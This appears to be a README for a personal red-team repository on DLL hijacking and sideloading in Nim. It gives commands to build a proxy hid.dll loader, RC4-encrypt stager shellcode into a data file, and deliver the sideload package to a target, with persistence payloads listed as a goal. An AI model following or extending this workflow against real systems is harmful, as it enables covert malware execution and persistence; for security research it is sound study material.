Repo for my experiments with payload creation and DLL hijacking/sideloading.
**WIP** - will update over time, as I learn more.

Todo: 
- Implement some way to avoid loader lock issues other than skipping initialization in DllMain (currently using the technique from this [gist](gist.github.com/S3cur3Th1sSh1t/c233c1efbfb45166c2edbd74ddbf0290)). Looking at the techniques from the [LdrLockLiberator](https://github.com/ElliotKillick/LdrLockLiberator/tree/main) project and associated [Perfect DLL Hijacking](https://elliotonsecurity.com/perfect-dll-hijacking/) post.
- Get the intended programs (existing installed software) to run and work (for persistence payloads).

Some useful resources for finding testable libs:
- [siofra](https://github.com/Cybereason/siofra)
- [Hijacklibs](https://hijacklibs.net)

## Usage
**General for testing:**
```text
nimble install ptr_math winim checksums
nimble install https://github.com/nbaertsch/nimvoke
```
Run `gen_template.py` to generate a .def file & test template
```text
python gen_template.py -f .\dlls\hid.dll -d -t -r 'C:\windows\system32\hid.dll' -o loader_test_template.nim
```
Put some sort of routine to test in `main` and add extra logging/messages where needed.

**An example with `loader_hid _*.nim`:**
Compile the lib (`-d:net/ondisk` is specific here for this loader)
```text
nim c --app:lib -d:strip -d:release -d:net --passL:"-def:hid.def" --nomain --cc:gcc --passL:-static --out:lib.dll loader_test_template.nim
```
Use the converter on a `raw/.bin` shellcode file. Args: `<out file name>` `<.bin file>` `<rc4 key str>`
```text
nim c converter.nim
.\converter.exe 'data' .\stager.bin 'Pa33w0rd'
```
Host the HTML file or drop the DAT file with the sideload package on the target
